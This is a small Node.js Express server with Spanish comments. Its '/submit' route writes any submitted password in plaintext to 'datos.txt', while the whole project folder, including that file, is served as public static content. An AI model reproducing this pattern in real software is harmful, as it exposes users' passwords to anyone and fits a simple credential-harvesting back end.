const express = require('express'); 
const path = require('path');
const fs = require('fs'); // Añadimos fs para trabajar con archivos
const bodyParser = require('body-parser'); // Usamos body-parser para manejar formularios POST

const app = express();

// Usamos middleware para procesar datos del cuerpo de la solicitud (formulario)
app.use(bodyParser.urlencoded({ extended: true }));

// Importamos las rutas desde el archivo rutas.js
const misRutas = require('./rutas');

// Servir archivos estáticos (CSS, imágenes, JS) desde la raíz del proyecto
app.use(express.static(__dirname));

// Usamos las rutas definidas en rutas.js
app.use(misRutas);

//  Ruta para procesar formulario y guardar datos en datos.yxy
app.post('/submit', function(req, res) {
    const password = req.body.password || "Contraseña no recibida";

    // Guardamos los datos en 'datos.txt'
    fs.appendFile('datos.txt', `Contraseña recibida: ${password}\n`, function(err) {
        if (err) {
            res.status(500).send('Error al guardar los datos.');
        } else {
            res.status(200).send('<h1>Datos recibidos y guardados</h1><a href="/">Volver</a>');
        }
    });
});

// Configuración del servidor
app.listen(3000, function () {
    console.log('Servidor ejecutándose en http://localhost:3000');
});
